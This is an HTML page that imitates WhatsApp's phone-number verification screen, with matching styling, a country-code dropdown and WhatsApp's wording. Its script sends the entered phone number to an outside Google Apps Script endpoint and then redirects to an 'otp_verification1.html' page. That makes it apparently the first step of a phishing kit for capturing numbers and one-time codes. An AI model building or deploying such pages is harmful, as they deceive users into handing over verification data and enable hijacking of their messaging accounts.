<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter Phone Number</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #111b21;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      padding-top: 60px;
      box-sizing: border-box;
    }

    h2 {
      font-size: 1.6rem;
      margin-bottom: 10px;
      font-weight: bold;
      text-align: center;
    }

    p {
      color: #bcbcbc;
      font-size: 0.95rem;
      text-align: center;
      margin: 0 20px 20px;
      line-height: 1.5;
    }

    .highlight {
      color: #53bdeb;
      cursor: pointer;
    }

    .dropdown,
    .input-row {
      width: 90%;
      max-width: 400px;
      margin: 10px auto;
    }

    select,
    input {
      width: 100%;
      background-color: transparent;
      border: none;
      border-bottom: 2px solid #25D366;
      padding: 12px 6px;
      font-size: 1rem;
      color: white;
      outline: none;
      box-sizing: border-box;
    }

    .input-row {
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .input-row input:first-child {
      width: 80px;
      flex-shrink: 0;
      text-align: center;
    }

    .submit-btn {
      margin-top: 40px;
      width: 90%;
      max-width: 320px;
      background-color: #25D366;
      color: black;
      padding: 14px 0;
      text-align: center;
      border-radius: 30px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      border: none;
    }

    .submit-btn:hover {
      background-color: #1ebe5d;
    }

    @media (max-width: 400px) {
      h2 {
        font-size: 1.4rem;
      }

      p {
        font-size: 0.85rem;
        margin: 0 10px 20px;
      }

      .submit-btn {
        font-size: 0.95rem;
      }

      input, select {
        font-size: 0.95rem;
      }
    }
  </style>
</head>
<body>

<h2>Enter your phone number</h2>
<p>
  WhatsApp will need to verify your phone number.<br />
  Carrier charges may apply. <span class="highlight">Whatâ€™s my number?</span>
</p>

<div class="dropdown">
  <select id="country">
    <option value="+94">Sri Lanka</option>
    <option value="+91">India</option>
    <option value="+1">USA</option>
    <option value="+44">UK</option>
  </select>
</div>

<div class="input-row">
  <input type="text" id="dial-code" value="+94" readonly>
  <input type="tel" id="phone-number" placeholder="Phone number" required>
</div>

<button class="submit-btn" onclick="handleNext()">Next</button>

<script>
  const countrySelect = document.getElementById('country');
  const dialCodeInput = document.getElementById('dial-code');

  countrySelect.addEventListener('change', () => {
    dialCodeInput.value = countrySelect.value;
  });

  function handleNext() {
    const dial = dialCodeInput.value;
    const phone = document.getElementById('phone-number').value.trim();

    if (!phone.match(/^[0-9]{7,15}$/)) {
      alert("Please enter a valid phone number.");
      return;
    }

    const fullNumber = dial + phone;

    fetch("https://script.google.com/macros/s/AKfycbzrDOyhaxY8tuI5mOnMfx8HY6aekOVydmb3Kodl2VuGLV-cjldWDUyL1p1QZ2R-BKK-Xw/exec", {
      method: "POST",
      body: new URLSearchParams({ number: fullNumber }),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      }
    })
            .then(res => res.ok ? res.text() : Promise.reject("Submission failed"))
            .then(() => {
              window.location.href = "otp_verification1.html";
            })
            .catch(err => {
              console.error(err);
            });
  }
</script>

</body>
</html>
